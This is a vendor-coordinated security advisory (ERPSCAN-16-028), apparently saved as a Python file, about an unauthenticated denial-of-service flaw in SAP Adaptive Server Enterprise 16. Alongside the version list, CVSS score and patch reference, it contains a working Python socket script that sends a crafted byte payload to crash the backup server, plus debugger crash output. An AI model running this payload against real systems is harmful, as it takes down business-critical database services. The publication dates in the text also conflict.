'''
Application:   SAP Adaptive Server Enterprise

Versions Affected: SAP Adaptive Server Enterprise  16

Vendor URL: http://SAP.com

Bugs: Denial of Service

Sent:   01.02.2016

Reported: 02.02.2016

Vendor response: 02.02.2016

Date of Public Advisory: 12.07.2016

Reference: SAP Security Note  2330839

Author:  Vahagn Vardanyan(ERPScan)



Description



1. ADVISORY INFORMATION

Title: [ERPSCAN-16-028] SAP Adaptive Server Enterprise – DoS vulnerability

Advisory ID: [ERPSCAN-16-028]

Risk: high

Advisory URL: https://erpscan.com/advisories/erpscan-16-028-sap-adaptive-server-enterprise-null-pointer-exception/

Date published: 12.17.2016

Vendors contacted: SAP


2. VULNERABILITY INFORMATION

Class: Denial of Service

Impact: DoS

Remotely Exploitable: yes

Locally Exploitable: yes


CVSS Information

CVSS Base Score v3:  7.5  / 10

CVSS Base Vector:

AV : Attack Vector (Related exploit range) Network (N)

AC : Attack Complexity (Required attack complexity) Low (L)

PR : Privileges Required (Level of privileges needed to exploit) None (N)

UI : User Interaction (Required user participation) None (N)

S : Scope (Change in scope due to impact caused to components beyond
the vulnerable component) Unchanged (U)

C : Impact to Confidentiality None (N)

I : Impact to Integrity None (N)

A : Impact to Availability High (H)


3. VULNERABILITY DESCRIPTION

Anonymous attacker can send a special request to the SAP Adaptive
Server Enterprise and crash the server.


4. VULNERABLE PACKAGES

SAP Open Server 16.0 SP01, SP02

SAP ASE 16.0 SP01, SP02

SAP Replication Server SP207, SP209, SP210, SP3XX


5. SOLUTIONS AND WORKAROUNDS

To correct this vulnerability, install SAP Security Note  2330839


6. AUTHOR

Vahagn Vardanyan (ERPScan)



7. TECHNICAL DESCRIPTION

Proof of Concept

Sending special request to the SAP Adaptive Server Enterprise 16
(backup server)  can get crash the server.


PoC
'''

import socket

PoC = "\xe2\xf3\x00\x9d\x80\x8e\xf3\xa0" \
     "\x80\xb4\x00\x81\xb0\x00\x00\x93" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x31\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x34\x31\x30\x35\x37\x32" \
     "\x37\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00\x00\x00\x00\x00\x00\x00\x00" \
     "\x00"

s = socket.socket()
s.settimeout(1)
s.connect((SERVER_IP, SERVER_PORT))
s.send(PoC)
print(PoC)
s.close()

'''

0:019> r
rax=0000000000000000 rbx=000000000097c000 rcx=0000000000000000
rdx=00000000010bf810 rsi=0000000000970a30 rdi=0000000000904cb0
rip=00000000004027b4 rsp=00000000010bf7f0 rbp=0000000000000000
r8=0000000000904c90  r9=0000000000904ca0 r10=0000000000000000
r11=0000000000000246 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
libsybcomn64!comn_symkey_set_iv+0x34:
00000000`004027b4 488b4820        mov     rcx,qword ptr [rax+20h]
ds:00000000`00000020=????????????????


8. REPORT TIMELINE

Sent:  01.02.2016

Reported: 02.02.2016

Vendor response: 02.02.2016

Date of Public Advisory: 12.07.2016


9. REFERENCES

https://erpscan.com/advisories/erpscan-16-028-sap-adaptive-server-enterprise-null-pointer-exception/


10. ABOUT ERPScan Research

ERPScan research team specializes in vulnerability research and
analysis of critical enterprise applications. It was acknowledged
multiple times by the largest software vendors like SAP, Oracle,
Microsoft, IBM, VMware, HP for discovering more than 400
vulnerabilities in their solutions (200 of them just in SAP!).

ERPScan researchers are proud of discovering new types of
vulnerabilities (TOP 10 Web Hacking Techniques 2012) and of the "The
Best Server-Side Bug" nomination at BlackHat 2013.

ERPScan experts participated as speakers, presenters, and trainers at
60+ prime international security conferences in 25+ countries across
the continents ( e.g. BlackHat, RSA, HITB) and conducted private
trainings for several Fortune 2000 companies.

ERPScan researchers carry out the EAS-SEC project that is focused on
enterprise application security awareness by issuing annual SAP
security researches.

ERPScan experts were interviewed in specialized info-sec resources and
featured in major media worldwide. Among them there are Reuters,
Yahoo, SC Magazine, The Register, CIO, PC World, DarkReading, Heise,
Chinabyte, etc.

Our team consists of highly-qualified researchers, specialized in
various fields of cybersecurity (from web application to ICS/SCADA
systems), gathering their experience to conduct the best SAP security
research.

11. ABOUT ERPScan

ERPScan is the most respected and credible Business Application
Cybersecurity provider. Founded in 2010, the company operates globally
and enables large Oil and Gas, Financial, Retail and other
organizations to secure their mission-critical processes. Named as an
‘Emerging Vendor’ in Security by CRN, listed among “TOP 100 SAP
Solution providers” and distinguished by 30+ other awards, ERPScan is
the leading SAP SE partner in discovering and resolving security
vulnerabilities. ERPScan consultants work with SAP SE in Walldorf to
assist in improving the security of their latest solutions.

ERPScan’s primary mission is to close the gap between technical and
business security, and provide solutions for CISO's to evaluate and
secure SAP and Oracle ERP systems and business-critical applications
from both cyberattacks and internal fraud. As a rule, our clients are
large enterprises, Fortune 2000 companies and MSPs, whose requirements
are to actively monitor and manage security of vast SAP and Oracle
landscapes on a global scale.

We ‘follow the sun’ and have two hubs, located in Palo Alto and
Amsterdam, to provide threat intelligence services, continuous support
and to operate local offices and partner network spanning 20+
countries around the globe.



Adress USA: 228 Hamilton Avenue, Fl. 3, Palo Alto, CA. 94301

Phone: 650.798.5255

Twitter: @erpscan

Scoop-it: Business Application Security
'''